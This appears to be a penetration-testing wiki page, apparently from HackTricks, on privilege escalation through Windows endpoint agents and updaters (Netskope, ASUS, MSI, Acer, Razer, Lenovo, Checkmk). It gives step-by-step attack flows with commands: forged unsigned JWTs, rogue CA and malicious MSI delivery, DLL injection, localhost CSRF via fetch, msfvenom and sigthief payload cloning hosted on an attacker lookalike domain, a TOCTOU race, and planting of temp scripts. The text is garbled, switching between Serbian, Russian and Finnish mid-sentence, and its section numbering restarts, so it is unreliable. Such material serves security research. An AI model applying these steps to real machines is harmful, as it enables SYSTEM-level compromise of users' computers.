# Zloupotreba enterprise automatskih ažuriranja i privilegovanog IPC-a (npr. Netskope, ASUS i MSI)

{{#include ../../banners/hacktricks-training.md}}

Ova stranica uopštava klasu lanaca za lokalno podizanje privilegija u Windowsu, pronađenih u enterprise agentima za krajnje uređaje i programima za ažuriranje koji izlažu IPC površinu sa malo prepreka i privilegovani tok ažuriranja. Reprezentativan primer je Netskope Client for Windows < R129 (CVE-2025-0309), gde korisnik sa niskim privilegijama može da preusmeri registraciju na server pod kontrolom napadača, a zatim isporuči zlonamerni MSI koji SYSTEM servis instalira.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

Ključne ideje koje možete primeniti na slične proizvode:
- Zloupotrebite localhost IPC privilegovanog servisa da biste primorali ponovnu registraciju ili rekonfiguraciju prema serveru napadača.
- Implementirajte vendorove update endpoint-e, isporučite neovlašćeni Trusted Root CA i usmerite program za ažuriranje na zlonamerni, „potpisani“ paket.
- Zaobiđite slabe provere potpisnika (CN allow-liste), opcione zastavice digest-a i neproverene MSI osobine.
- Ako je IPC „šifrovan“, izvedite ključ/IV iz identifikatora mašine dostupnih za čitanje svima i sačuvanih u registry-ju.
- Ako servis ograničava pozivaoce na osnovu putanje до извршне датотеке/naziva procesa, izvršite injection u proces sa allow-liste ili pokrenite takav proces u suspendovanom stanju i bootstrap-ujte svoj DLL minimalnom izmenom konteksta niti.

Prilagođeni lokalni TCP servisi zahtevaju istu proveru identiteta i granica ulaznih podataka, čak i kada zahtevaju PIN ili druge aplikacione kredencijale. Utvrdite koji proces i efektivni servisni nalog koriste listener, a zatim proverite tačno instaliranu izvršnu datoteku/verziju i da li se polja pod kontrolom pozivaoca proveravaju po dužini pre kopiranja u bafer fiksne veličine ili upotrebe pri sastavljanju komande za child-process. [Microsoft-ova smernica za prekoračenje bafera](https://learn.microsoft.com/en-us/windows/win32/secbp/avoiding-buffer-overruns) objašnjava zašto su neprovereni eksterni ulazni podaci opasni u privilegovanom nativnom kodu. Listener na loopback adresi, hardkodovani kredencijal ili samo naziv procesa ne dokazuju oštećenje memorije niti izvršavanje kao SYSTEM; dostupnost, autorizacija, putanja izvršavanja koda i mere ublažavanja i dalje su zasebni uslovi. Uobičajenu enumeraciju obavljajte пасивно, без слања улазних података чија би дужина могла да изазове пад активном сервису.

---
## 1) Принудна регистрација на сервер нападача преко localhost IPC-а

Многи агенти испоручују user-mode UI процес који комуницира са SYSTEM сервисом преко localhost TCP-а користећи JSON.

Примећено у Netskope:
- UI: stAgentUI (low integrity) ↔ Service: stAgentSvc (SYSTEM)
- IPC command ID 148: IDP_USER_PROVISIONING_WITH_TOKEN

Ток експлоатације:
1) Направите JWT enrollment token чији захтеви контролишу backend хост (нпр. AddonUrl). Користите alg=None да потпис не би био потребан.
2) Пошаљите IPC поруку која позива команду за provisioning, уз ваш JWT и tenant name:

```json
{
  "148": {
    "idpTokenValue": "<JWT with AddonUrl=attacker-host; header alg=None>",
    "tenantName": "TestOrg"
  }
}
```

3) Servis počinje da šalje zahteve vašem zlonamernom serveru radi registracije/konfiguracije, npr.:
- /v1/externalhost?service=enrollment
- /config/user/getbrandingbyemail

Napomene:
- Ako se provera pozivaoca zasniva na putanji/imenu, pošaljite zahtev iz binarne datoteke dobavljača sa liste dozvoljenih (pogledajte §4).<sup>[[1]](#references)[[2]](#references)</sup>

---
## 2) Preuzimanje kontrole nad kanalom za ažuriranje radi pokretanja koda kao SYSTEM

Kada klijent počne da komunicira sa vašim serverom, implementirajte očekivane endpoint-e i naterajte ga da preuzme MSI koji kontroliše napadač. Uobičajen sled:

1) /v2/config/org/clientconfig → Vratite JSON konfiguraciju sa veoma kratkim intervalom ažuriranja, npr.:
```json
{
  "clientUpdate": { "updateIntervalInMin": 1 },
  "check_msi_digest": false
}
```
2) /config/ca/cert → Vratite PEM CA sertifikat. Servis ga instalira u skladište Trusted Root za Local Machine.
3) /v2/checkupdate → Dostavite metapodatke koji upućuju na zlonamerni MSI i lažnu verziju.

Zaobilaženje čestih provera koje se sreću u praksi:
- Allow-list za CN potpisnika: servis može samo da proverava da li je Subject CN jednak vrednosti „netSkope Inc” ili „Netskope, Inc.”. Vaš rogue CA može da izda leaf sertifikat sa tim CN-om i njime potpiše MSI.
- Svojstvo CERT_DIGEST: uključite bezopasno MSI svojstvo pod nazivom CERT_DIGEST. Pri instalaciji se ne proverava.
- Opciona provera digest-a: zastavica konfiguracije (npr. check_msi_digest=false) isključuje dodatnu kriptografsku proveru.

Rezultat: SYSTEM servis instalira vaš MSI iz putanje
C:\ProgramData\Netskope\stAgent\data\*.msi
i izvršava proizvoljan kod kao NT AUTHORITY\SYSTEM.<sup>[[1]](#references)[[2]](#references)</sup>

Pouka o zaobilaženju zakrpa: ako dobavljač kao odgovor uvede allow-list malog broja „pouzdanih” domena umesto da kriptografski autentifikuje izvor ažuriranja, potražite redirektore ili reverse proxy-je u vlasništvu dobavljača koji vam i dalje omogućavaju da usmeravate saobraćaj. U slučaju kompanije Netskope, naknadno javno istraživanje pokazalo je da se allow-list iz perioda R129 i dalje mogao zloupotrebiti preko `rproxy.goskope.com`, koji je prosleđivao sadržaj Azure App Service-a pod kontrolom napadača. Allow-list-e naziva hostova smatrajte preprekom koju treba preskočiti, a ne granicom poverenja.<sup>[[14]](#references)</sup>

---
## 3) Falsifikovanje šifrovanih IPC zahteva (kada postoje)

Od verzije R127, Netskope je umotao IPC JSON u polje encryptData koje izgleda kao Base64. Reverzni inženjering je otkrio AES, sa ključem/IV-om izvedenim iz vrednosti registra koje može da čita svaki korisnik:
- Key = HKLM\SOFTWARE\NetSkope\Provisioning\nsdeviceidnew
- IV  = HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProductID

Napadači mogu da reprodukuju šifrovanje i šalju važeće šifrovane komande kao standardni korisnik.<sup>[[1]](#references)[[2]](#references)</sup> Opšti savet: ako agent odjednom počne da „šifruje” svoj IPC, potražite ID-jeve uređaja, GUID-ove proizvoda i ID-jeve instalacije u HKLM koji se koriste kao ključni materijal.

---
## 4) Zaobilaženje allow-list-a IPC pozivalaca (provere putanje/naziva)

Neke usluge pokušavaju da autentifikuju drugu stranu tako što utvrđuju PID TCP veze i porede putanju/naziv izvršne datoteke sa allow-list-om izvršnih datoteka dobavljača koje se nalaze u Program Files (npr. stagentui.exe, bwansvc.exe, epdlp.exe).

Dva praktična načina zaobilaženja:
- DLL injection u allow-list-ovan proces (npr. nsdiag.exe) i prosleđivanje IPC zahteva iz njega.
- Pokrenite allow-list-ovanu izvršnu datoteku u suspendovanom stanju i pokрените svoj proxy DLL bez CreateRemoteThread (pogledajte §5), kako biste zadovoljili pravila zaštite od neovlašćenih izmena koja nameće drajver.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 5) Injection kompatibilan sa zaštitom od neovlašćenih izmena: suspendovan proces + zakrpa NtContinue

Proizvodi često uključuju minifilter/OB callbacks drajver (npr. Stadrv) koji uklanja opasna prava iz handle-ova ka zaštićenim procesima:
- Proces: uklanja PROCESS_TERMINATE, PROCESS_CREATE_THREAD, PROCESS_VM_READ, PROCESS_DUP_HANDLE, PROCESS_SUSPEND_RESUME
- Nit: ograničava prava na THREAD_GET_CONTEXT, THREAD_QUERY_LIMITED_INFORMATION, THREAD_RESUME, SYNCHRONIZE

Pouzdan loader u user-mode režimu koji poštuje ova ograničenja:
1) Pozovite CreateProcess za izvršnu datoteku dobavljača uz CREATE_SUSPENDED.
2) Nabavite handle-ove koji su vam i dalje dozvoljeni: PROCESS_VM_WRITE | PROCESS_VM_OPERATION za proces i handle niti sa THREAD_GET_CONTEXT/THREAD_SET_CONTEXT (ili samo THREAD_RESUME ako zakrpite kod na poznatom RIP-u).
3) Prepišite ntdll!NtContinue (ili neki drugi thunk koji se sigurno mapira rano) malim stubom koji poziva LoadLibraryW za putanju do vaše DLL datoteke, a zatim skače nazad.
4) Pozovite ResumeThread da biste pokrenuli stub u procesu i učitali svoju DLL.

Pošto niste koristili PROCESS_CREATE_THREAD ni PROCESS_SUSPEND_RESUME nad već zaštićenim procesom (vi ste ga kreirali), pravila drajvera su ispoštovana.<sup>[[1]](#references)[[2]](#references)</sup>

---
## 6) Praktični alati
- NachoVPN (Netskope plugin) automatizuje rogue CA, potpisivanje zlonamernog MSI-ja i hostovanje potrebnih endpoint-a: /v2/config/org/clientconfig, /config/ca/cert, /v2/checkupdate.<sup>[[3]](#references)</sup>
- UpSkope je prilagođeni IPC klijent koji sastavlja proizvoljne IPC poruke (po izboru AES-šifrovane) i uključuje injection u suspendovan proces da bi se poruke slale iz allow-list-ovane izvršne datoteke.<sup>[[4]](#references)</sup>

## 7) Brzi postupak trijaže nepoznatih updater/IPC površina

Kada se susretnete sa novim endpoint agentom ili paketom „pomoćnih” programa za matičnu ploču, kratak postupak je obično dovoljan da utvrdite da li je reč o obećavajućoj meti za privesc:<sup>[[6]](#references)</sup>

1) Nabrojte loopback listenere i povežite ih sa procesima dobavljača:

```powershell
Get-NetTCPConnection -State Listen |
  Where-Object {$_.LocalAddress -in @('127.0.0.1', '::1', '0.0.0.0', '::')} |
  Select-Object LocalAddress,LocalPort,OwningProcess,
    @{n='Process';e={(Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue).Path}}
```

2) Izlistajte potencijalne imenovane cevi:

```powershell
[System.IO.Directory]::GetFiles("\\.\pipe\") | Select-String -Pattern 'asus|msi|razer|acer|agent|update'
```

3) Prikupite podatke o rutiranju iz registra koje koriste IPC serveri zasnovani na dodacima:

```powershell
Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\MSI\MSI Center\Component' |
  Select-Object PSChildName
```

4) Najpre izdvojte nazive endpointa, JSON ključeve i ID-jeve komandi iz klijenta u korisničkom režimu. Upakovani Electron/.NET frontend-i često leak-uju celu šemu:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.js','C:\Program Files\Vendor\**\*.dll' `
  -Pattern '127.0.0.1|localhost|UpdateApp|checkupdate|NamedPipe|LaunchProcess|Origin'
```

5) Pronađite stvarni uslov poverenja, a ne samo putanju koda koja na kraju pokreće proces:

```powershell
Select-String -Path 'C:\Program Files\Vendor\**\*.exe','C:\Program Files\Vendor\**\*.dll','C:\Program Files\Vendor\**\*.js' `
  -Pattern 'WinVerifyTrust|CryptQueryObject|Origin|Referer|Subject|CN=|ExecuteTask|LaunchProcess|CreateProcessAsUser'
```

Obrasci kojima vredi dati prioritet:
- `CryptQueryObject`/parsiranje sertifikata bez `WinVerifyTrust` obično znači da je „sertifikat postoji” tretirano kao „sertifikat je pouzdan”, što omogućava kloniranje sertifikata ili druge trikove s lažnim potpisnikom.
- Provere podniske/sufiksa nad `Origin`, `Referer`, URL-ovima za preuzimanje, imenima procesa ili CN-ovima potpisnika nisu autentifikacija. `contains(".vendor.com")` je obično moguće zloupotrebiti pomoću domena sličnog izgleda koji kontroliše napadač.
- Ako GUI sa niskim privilegijama odlučuje da je „datoteka pouzdana”, a SYSTEM broker samo koristi taj rezultat, ispravljanje ili ponovna implementacija klijentskog DLL-a/JS-a često u potpunosti zaobilazi granicu (podeljena validacija u stilu Razer-a).
- Ako broker kopira payload u `%TEMP%`/`C:\Windows\Temp`, a zatim ga validira ili zakazuje sa te putanje, odmah testirajte prozore za TOCTOU zamenu i susedne module dodataka koji izlažu alternativne omotače `ExecuteTask()` sa slabijim proverama.<sup>[[6]](#references)</sup>

Za mete koje intenzivno koriste named pipe-ove, PipeViewer je brz način da uočite slabe DACL-ove i pipe-ove kojima se može pristupiti na daljinu pre nego što počnete detaljno da reverzujete protokol.<sup>[[11]](#references)</sup>

Ako meta autentifikuje pozivaoce samo prema PID-u, putanji slike ili imenu procesa, tretirajte to kao prepreku koja samo usporava, a ne kao granicu: ubacivanje koda u legitimni klijent ili uspostavljanje veze iz procesa na listi dozvoljenih često je dovoljno da zadovolji provere servera. Konkretno za named pipe-ove, [ova stranica o impersonation-u klijenta i zloupotrebi pipe-ova](named-pipe-client-impersonation.md) detaljnije obrađuje tu primitivu.

Kod privilegovanog **broker-a za čišćenje ili vraćanje**, proverite i granicu poverenja putanje, kao i ACL pipe-a. Pozivalac sa nižim privilegijama možda može da izabere odredište za vraćanje ili preimenuje pripremljeni rezervni artefakt u deljenom direktorijumu, čak i kada su izvršna datoteka servisa i njen instalacioni direktorijum zaštićeni. Zasebno potvrdite da pozivalac može da dođe do komande za vraćanje, da može da izmeni tačno određeni pripremljeni ulaz ili ime datoteke, da se broker izvršava pod identitetom sa višim privilegijama i da njegova operacija vraćanja zaista upisuje u izabranu zaštićenu putanju. Direktorijum za pripremu u koji može da se upisuje ili pipe koji može da se čita sami po sebi ne potvrđuju proizvoljan privilegovani upis; mapiranje odredišta i ponašanje servisa treba proveriti pregledom koda ili kontrolisanim testiranjem. Nemojte pozivati nepoznatu komandu za čišćenje tokom pasivne enumeracije jer može obrisati korisničke datoteke.

---
## 8) Modularni broker-i dodataka autentifikovani samo potpisima dobavljača (Lenovo Vantage obrazac)

Novija varijanta vredna potrage je **RPC broker sa potpisanim klijentom**: Lenovo-signed desktop proces sa niskim privilegijama komunicira sa SYSTEM servisom, a servis prosleđuje JSON komande skupu dodataka opisanih XML-om u `%ProgramData%`. Kada se postigne izvršavanje koda **unutar bilo kog prihvaćenog potpisanog klijenta**, svaki ugovor sa `runas="system"` postaje deo površine napada.<sup>[[15]](#references)</sup>

Vredne primitive uočene u istraživanju Lenovo Vantage-a:
- **Poverenje u pozivaoca zato što ga je potpisao dobavljač**: istraživači su došli do autentifikovanog konteksta tako što su kopirali Lenovo-signed EXE u direktorijum u koji može da se upisuje i zadovoljili uslov za DLL side-load (`profapi.dll`), čime se proizvoljan kod izvršavao unutar klijenta kome je servis već verovao.
- **Otkrivanje površine napada zasnovano na manifestima**: dodaci su deklarisani u `C:\ProgramData\Lenovo\Vantage\Addins\*.xml`; nekoliko ugovora se izvršava kao `SYSTEM`, pa enumerisanje tih manifesta često otkriva stvarne privilegovane radnje brže od reverzovanja samog broker-a.
- **Greške po pojedinačnim komandama iza autentifikovanog kanala**: nakon ulaska u pouzdanog klijenta, javna istraživanja su otkrila ranjivosti path traversal + race condition u komandama za ažuriranje/instalaciju, zloupotrebu raw SQL-a u privilegovanim bazama podešavanja i provere putanja registra zasnovane na podniski, koje su omogućavale upise izvan predviđenog hive-a.

Korisno izviđanje na meti:

```powershell
Get-ChildItem "$env:ProgramData\Lenovo\Vantage\Addins" -Filter *.xml |
  Select-String -Pattern 'runas="system"|<name>|<namespace>'
```

```powershell
Select-String -Path 'C:\Program Files\Lenovo\**\*.dll','C:\Program Files\Lenovo\**\*.exe' `
  -Pattern 'contract|command|payload|DeleteTable|DeleteSetting|Set-KeyChildren|DownloadAndInstallAppComponent|InstallOnly'
```

Praktična pouka: kad god pomoćni paket izlaže broker koji najpre autentifikuje **proces pozivaoca**, a tek zatim prosleđuje pozive desetinama komandi dodataka/pluginova, nemojte stati nakon zaobilaženja provere poverenja na ulazu. Izdvojite tabelu manifesta/ugovora i zasebno fuzz-ujte svaku komandu sa visokim privilegijama; autentifikovani kanal obično skriva nekoliko grešaka u drugoj fazi.

---
## 1) CSRF iz pregledača ka localhost-u protiv privilegovanih HTTP API-ja (ASUS DriverHub)

DriverHub isporučuje HTTP servis u korisničkom režimu (ADU.exe) na adresi 127.0.0.1:53000, koji očekuje da pozivi iz pregledača dolaze sa https://driverhub.asus.com. Provera porekla jednostavno izvršava `string_contains(".asus.com")` nad zaglavljem Origin i URL-ovima za preuzimanje dostupnim preko `/asus/v1.0/*`. Zato svaki host pod kontrolom napadača, kao što je `https://driverhub.asus.com.attacker.tld`, prolazi proveru i može da šalje zahteve koji menjaju stanje iz JavaScript-a.<sup>[[6]](#references)</sup> Pogledajte [osnove CSRF-a](../../pentesting-web/csrf-cross-site-request-forgery.md) za dodatne obrasce zaobilaženja.

Praktičan tok:
1) Registrujte domen koji sadrži `.asus.com` i na njemu hostujte zlonamernu veb-stranicu.
2) Upotrebite `fetch` ili XHR da pozovete privilegovanu krajnju tačku (npr. `Reboot`, `UpdateApp`) na `http://127.0.0.1:53000`.
3) Pošaljite JSON telo koje handler očekuje – upakovani frontend JS prikazuje šemu u nastavku.

```javascript
fetch("http://127.0.0.1:53000/asus/v1.0/Reboot", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body: JSON.stringify({ Event: [{ Cmd: "Reboot" }] })
});
```

Čak i PowerShell CLI prikazan ispod uspeva kada se zaglavlje Origin spoofuje tako da sadrži pouzdanu vrednost:

```powershell
Invoke-WebRequest -Uri "http://127.0.0.1:53000/asus/v1.0/Reboot" -Method Post \
  -Headers @{Origin="https://driverhub.asus.com"; "Content-Type"="application/json"} \
  -Body (@{Event=@(@{Cmd="Reboot"})}|ConvertTo-Json)
```

Svaka poseta napadačevom sajtu u tom slučaju postaje CSRF na lokalnom računaru sa jednim klikom (ili bez klika preko `onload`), koji pokreće pomoćni proces sa SYSTEM privilegijama.

---
## 2) Nesigurna provera code-signing potpisa i kloniranje sertifikata (ASUS UpdateApp)

`/asus/v1.0/UpdateApp` preuzima proizvoljne izvršne datoteke navedene u JSON telu zahteva i kešira ih u `C:\ProgramData\ASUS\AsusDriverHub\SupportTemp`. Provera URL-a za preuzimanje koristi istu logiku podniza, pa se prihvata `http://updates.asus.com.attacker.tld:8000/payload.exe`. Nakon preuzimanja, ADU.exe samo proverava da li PE sadrži potpis i da li se Subject string podudara sa ASUS-om pre pokretanja – bez `WinVerifyTrust` i bez provere lanca sertifikata.

Da biste iskoristili ovaj tok:
1) Napravite payload (npr. `msfvenom -p windows/exec CMD=notepad.exe -f exe -o payload.exe`).
2) Klonirajte ASUS-ov potpisivač u njega (npr. `python sigthief.py -i ASUS-DriverHub-Installer.exe -t payload.exe -o pwn.exe`).
3) Hostujte `pwn.exe` na domenu koji liči na `.asus.com` i pokrenite UpdateApp preko prethodno opisanog browser CSRF-a.

Pošto se i Origin i URL proveravaju pomoću podniza, a provera potpisivača samo poredi stringove, DriverHub preuzima i izvršava napadačevu binarnu datoteku u svom povišenom kontekstu.<sup>[[6]](#references)</sup>

---
## 1) TOCTOU u putanjama za kopiranje/izvršavanje programa za ažuriranje (MSI Center CMD_AutoUpdateSDK)

SYSTEM servis MSI Center-a izlaže TCP protokol u kojem se svaki okvir sastoji od `4-byte ComponentID || 8-byte CommandID || ASCII arguments`. Osnovna komponenta (Component ID `0f 27 00 00`) sisältää `CMD_AutoUpdateSDK = {05 03 01 08 FF FF FF FC}`. Обработчик:
1) Копирует указанный исполняемый файл в `C:\Windows\Temp\MSI Center SDK.exe`.
2) Проверяет подпись через `CS_CommonAPI.EX_CA::Verify` (subject сертификата должен совпадать с “MICRO-STAR INTERNATIONAL CO., LTD.”, а `WinVerifyTrust` должен завершиться успешно).
3) Создаёт запланированную задачу, которая запускает временный файл от имени SYSTEM с аргументами, контролируемыми злоумышленником.

Копируемый файл не блокируется на время между проверкой и вызовом `ExecuteTask()`. Злоумышленник может:
- Отправить Frame A, указывающий на легитимный бинарный файл с подписью MSI (это гарантирует успешную проверку подписи и постановку задачи в очередь).
- Устроить гонку, отправляя повторяющиеся сообщения Frame B, указывающие на вредоносный payload и перезаписывающие `MSI Center SDK.exe` сразу после завершения проверки.

Когда срабатывает планировщик, он запускает перезаписанный payload с правами SYSTEM, несмотря на то, что проверялся исходный файл. Для надёжной эксплуатации используются две goroutines/threads, которые непрерывно отправляют CMD_AutoUpdateSDK, пока не удастся выиграть TOCTOU-окно.<sup>[[6]](#references)</sup>

---
## 2) Использование пользовательских IPC с уровнем SYSTEM и impersonation (MSI Center + Acer Control Centre)

### Наборы TCP-команд MSI Center
- Каждый plugin/DLL, загруженный `MSI.CentralServer.exe`, получает Component ID, хранящийся в `HKLM\SOFTWARE\MSI\MSI_CentralServer`. Первые 4 байта фрейма выбирают этот компонент, что позволяет злоумышленникам направлять команды произвольным модулям.
- Plugins могут определять собственные task runners. `Support\API_Support.dll` предоставляет `CMD_Common_RunAMDVbFlashSetup = {05 03 01 08 01 00 03 03}` и напрямую вызывает `API_Support.EX_Task::ExecuteTask()` **без проверки подписи** — любой локальный пользователь может указать `C:\Users\<user>\Desktop\payload.exe` и гарантированно получить выполнение с правами SYSTEM.
- Перехват трафика loopback с помощью Wireshark или анализ .NET-бинарников в dnSpy быстро выявляет соответствие компонентов и команд; затем пользовательские Go/Python-клиенты могут повторно отправлять фреймы.<sup>[[6]](#references)</sup>

### Named pipes Acer Control Centre и уровни impersonation
- `ACCSvc.exe` (SYSTEM) предоставляет `\\.\pipe\treadstone_service_LightMode`, а его discretionary ACL разрешает удалённым клиентам подключение (например, `\\TARGET\pipe\treadstone_service_LightMode`). Отправка ID команды `7` с путём к файлу вызывает процедуру сервиса для запуска процесса.
- Клиентская библиотека сериализует вместе с аргументами байт-маркер окончания (113). Динамическая инструментализация с помощью Frida/`TsDotNetLib` (советы по инструментализации см. в [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/README.md)) показывает, что native-обработчик сопоставляет это значение с `SECURITY_IMPERSONATION_LEVEL` и integrity SID перед вызовом `CreateProcessAsUser`.
- Замена 113 (`0x71`) на 114 (`0x72`) переводит выполнение в общую ветвь, которая сохраняет полный SYSTEM token и задаёт SID высокого уровня целостности (`S-1-16-12288`). Поэтому запущенный бинарный файл работает с неограниченными правами SYSTEM как локально, так и на другом компьютере.
- Сочетайте это с доступным флагом установщика (`Setup.exe -nocheck`), чтобы установить ACC даже на лабораторных виртуальных машинах и проверить работу pipe без оборудования производителя.<sup>[[6]](#references)</sup>

Эти ошибки IPC показывают, почему localhost-сервисы должны обеспечивать взаимную аутентификацию (ALPC SIDs, фильтры `ImpersonationLevel=Impersonation`, фильтрацию токенов), а также почему все вспомогательные функции модулей для «запуска произвольного бинарного файла» должны применять одинаковые проверки подписи.

---
## 3) COM/IPC-помощники «elevator» со слабой проверкой в user mode (Razer Synapse 4)

В Razer Synapse 4 появился ещё один характерный пример: пользователь с низкими привилегиями может попросить COM-помощник запустить процесс через `RzUtility.Elevator`, при этом решение о доверии делегируется user-mode DLL (`simple_service.dll`), а не обеспечивается надёжно внутри привилегированной границы.

Наблюдавшийся путь эксплуатации:
- Создайте экземпляр COM-объекта `RzUtility.Elevator`.
- Вызовите `LaunchProcessNoWait(<path>, "", 1)`, чтобы запросить запуск с повышенными привилегиями.
- В общедоступном PoC проверка PE-подписи внутри `simple_service.dll` пропатчена до отправки запроса, что позволяет запустить произвольный исполняемый файл, выбранный злоумышленником.<sup>[[6]](#references)[[10]](#references)</sup>

Минимальный вызов PowerShell:

```powershell
$com = New-Object -ComObject 'RzUtility.Elevator'
$com.LaunchProcessNoWait("C:\Users\Public\payload.exe", "", 1)
```

Opšti zaključak: pri reverznom inženjeringu „helper“ paketa nemojte se zaustaviti na localhost TCP-u ili named pipe-ovima. Proverite postoje li COM klase s nazivima kao što su `Elevator`, `Launcher`, `Updater` ili `Utility`, a zatim utvrdite da li privilegovani servis zaista sam proverava ciljnu binarnu datoteku ili samo veruje rezultatu koji izračunava DLL klijenta u korisničkom režimu, koji se može izmeniti. Ovaj obrazac nije specifičan za Razer: svaki dizajn sa podeljenim ulogama, gde broker s visokim privilegijama prihvata odluku o dozvoli/odbijanju sa strane s niskim privilegijama, potencijalna je površina za privesc.


---
## Predvidljivo izvršavanje privremenih skripti tokom MSI popravke (Checkmk Agent / CVE-2024-0670)

Neki Windows agenti i dalje izvršavaju privilegovane radnje tako što upisuju privremenu `.cmd` datoteku u `C:\Windows\Temp` i pokreću je kao `SYSTEM`. Ako je naziv datoteke predvidljiv, a servis ne kreira bezbedno novu datoteku umesto postojeće, korisnik s niskim privilegijama može unapred da kreira buduću privremenu datoteku, postavi je kao **samo za čitanje** i navede privilegovani proces da izvrši sadržaj koji kontroliše napadač umesto sopstvene skripte.

Uočeno u ranjivim izdanjima Checkmk Agent-a:
- obrazac privremene datoteke: `cmk_all_<PID>_1.cmd`
- pogođene grane: `2.0.0`, `2.1.0`, `2.2.0`
- okidač: **popravka** MSI кешираног пакета агента<sup>[[8]](#references)[[9]](#references)</sup>

Praktičan postupak:
1. Procena realističnog opsega PID-ova na osnovu trenutnih ID-ova procesa ili PID-a pokrenutog agenta.
2. Zapisati kratak `.cmd` payload u **ASCII** formatu (`Set-Content -Encoding Ascii` ili preusmeravanje izlaza iz `cmd.exe`; izbegavati PowerShell izlaz u UTF-16 formatu za batch datoteke).
3. Napraviti datoteke `C:\Windows\Temp\cmk_all_<PID>_1.cmd` za ceo mogući opseg i označiti svaku kao samo za čitanje.
4. Pokrenuti popravku keširanog MSI-ja, tako da privilegovani servis pokuša da ponovo kreira, a zatim izvrši privremenu skriptu.<sup>[[7]](#references)</sup>

```powershell
Set-Content -Path C:\ProgramData\payload.cmd -Encoding Ascii -Value "@echo off`nwhoami > C:\ProgramData\proof.txt"
1..10000 | ForEach-Object {
  Copy-Item C:\ProgramData\payload.cmd "C:\Windows\Temp\cmk_all_${_}_1.cmd"
  Set-ItemProperty "C:\Windows\Temp\cmk_all_${_}_1.cmd" -Name IsReadOnly -Value $true
}
```

Ako je ranjivi proizvod instaliran pomoću Windows Installer-a, utvrdite naziv proizvoda kojem pripada MSI datoteka sa nasumičnim nazivom u kešu pod `C:\Windows\Installer` pre nego što pokrenete popravku:<sup>[[7]](#references)</sup>

```powershell
Get-ChildItem "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\UserData\S-1-5-18\Products\*\InstallProperties" |
  ForEach-Object {
    $p = Get-ItemProperty $_.PSPath
    [PSCustomObject]@{Name=$p.DisplayName; Pkg=$p.LocalPackage}
  } | Where-Object Name -like "*Check MK Agent*"

msiexec /fa C:\Windows\Installer\<cached-agent>.msi
```

Operativne napomene:
- `qwinsta` je koristan kada `msiexec /fa` ne uspe iz neinteraktivne WinRM ljuske i treba da utvrdite da li postojeća desktop/isključena sesija može pravilno da pokrene popravku.<sup>[[7]](#references)</sup>
- Ovaj obrazac se može primeniti i na druge agentske programe za krajnje uređaje i programe za ažuriranje koji **postavljaju privremene skripte na lokacije sa dozvolama za pisanje svim korisnicima, a kasnije ih izvršavaju kao SYSTEM**. Proverite da li koriste predvidljiva imena, da li nedostaje semantika ekskluzivnog kreiranja i da li se tokovi popravke/ažuriranja mogu pokrenuti na zahtev.

### Interaktivna popravka instalatora i privilegovana konzola

PDF24 Creator 11.15.1 pokazuje zaseban rizik pri popravci MSI-ja: prilagođena akcija za instalaciju štampača može tokom popravke da pokrene vidljivu konzolu sa SYSTEM privilegijama. Dobavljač je izmenio MSI instalator u verziji 11.15.2 kako bi rešio ovo ponašanje. Starija verzija proizvoda samo je trag za trijažu. Proverite registrovani ili dostupni MSI paket, da li ovaj korisnik može da pokrene popravku, da li su prisutni ranjiva prilagođena akcija i odlaganje upisivanja u log datoteku i da li interaktivna radna površina može da prikaže konzolu. Prijavljeno odlaganje koristilo je oplock na `faxPrnInst.log`; obična mogućnost pisanja u datoteku nije jedini uslov za pristup. Neinteraktivna ljuska, nedostupan paket ili zakrpljeni instalator mogu prekinuti ovaj lanac. Ovaj problem ne zavisi od `AlwaysInstallElevated` i razlikuje se od zamene predvidljive privremene skripte.

---
## Daljinsko preuzimanje lanca snabdevanja putem slabe provere programa za ažuriranje (WinGUp / Notepad++)

Između juna 2025. i decembra 2025. napadači koji su kompromitovali infrastrukturu za hostovanje u pozadini toka ažuriranja Notepad++-a selektivno su isporučivali zlonamerne manifeste odabranim žrtvama. Stariji programi za ažuriranje zasnovani na WinGUp-u nisu u potpunosti proveravali autentičnost ažuriranja, pa je zlonameran XML odgovor mogao da preusmeri klijente na URL-ove pod kontrolom napadača. Pošto je klijent prihvatao HTTPS sadržaj, a da pritom nije zahtevao i pouzdan lanac sertifikata i važeći PE potpis preuzetog instalatora, žrtve su preuzimale i izvršavale trojanizovani NSIS `update.exe`.<sup>[[12]](#references)[[13]](#references)</sup>

Operativni tok (nije potreban lokalni exploit):
1. **Presretanje infrastrukture**: kompromitovati CDN/hosting i odgovoriti na provere ažuriranja metapodacima napadača koji upućuju na zlonamerni URL za preuzimanje.
2. **Trojanizovani NSIS**: instalator preuzima/izvršava payload i zloupotrebljava dva lanca izvršavanja:
   - **Korišćenje sopstvenog potpisanog binarnog fajla + sideload**: isporučiti potpisani Bitdefender `BluetoothService.exe` i postaviti zlonamerni `log.dll` u putanju pretrage. Kada se potpisani binarni fajl pokrene, Windows učitava `log.dll` putem sideload-a; DLL dešifruje i reflektivno učitava Chrysalis backdoor (zaštićen mehanizmom Warbird + API hashing radi otežavanja statičke detekcije).
   - **Ubacivanje shellcode-a putem skripte**: NSIS izvršava kompajlовану Lua skriptu koja koristi Win32 API-je (npr. `EnumWindowStationsW`) za ubacivanje shellcode-a i postavljanje Cobalt Strike Beacon-а.<sup>[[12]](#references)</sup>

Preporuke za ojačavanje zaštite/detekciju za bilo koji program za automatsko ažuriranje:
- Zahtevajte **proveru sertifikata i potpisa** preuzetog instalatora (fiksirajte potpisnika dobavljača, odbacite nepodudaranje CN-a/lanca) i potpišite sam manifest ažuriranja (npr. XMLDSig). Blokirajte preusmeravanja koje kontroliše manifest, osim ako nisu validirana.
- Tretirajte **sideload potpisanog binarnog fajla koji napadač obezbeđuje** kao tačku za detekciju nakon preuzimanja: generišite upozorenje kada potpisani EXE dobavljača učitava DLL sa imenom koje se nalazi izvan kanonske putanje za instalaciju (npr. Bitdefender učitava `log.dll` iz Temp/Downloads) i kada program za ažuriranje postavlja/izvršava instalatore iz privremene fascikle koji nemaju potpis dobavljača.
